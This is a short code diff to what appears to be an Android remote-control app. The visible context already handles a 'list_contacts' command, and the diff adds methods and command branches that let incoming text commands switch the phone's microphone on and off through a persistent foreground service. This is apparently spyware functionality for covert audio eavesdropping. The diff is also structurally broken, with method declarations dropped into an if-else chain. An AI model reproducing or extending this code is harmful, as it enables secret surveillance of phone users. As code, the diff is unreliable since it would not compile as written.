@@ -23,6 +23,26 @@ else if (line.equalsIgnoreCase("list_contacts")) {
 
 
 
+//Mic 
+
+  public void micOn() {
+        Intent intent = new Intent(this, KeepServiceAlive.class);
+        intent.setAction("MIC_ON");
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent);
+        else startService(intent);
+    }
+
+    public void micOff() {
+        Intent intent = new Intent(this, KeepServiceAlive.class);
+        intent.setAction("MIC_OFF");
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent);
+        else startService(intent);
+    }
+
+else if (line.equalsIgnoreCase("MIC_ON")) { if (instance != null) instance.micOn(); }
+else if (line.equalsIgnoreCase("MIC_OFF")) { if (instance != null) instance.micOff(); }
+                    }
+
 
 
 
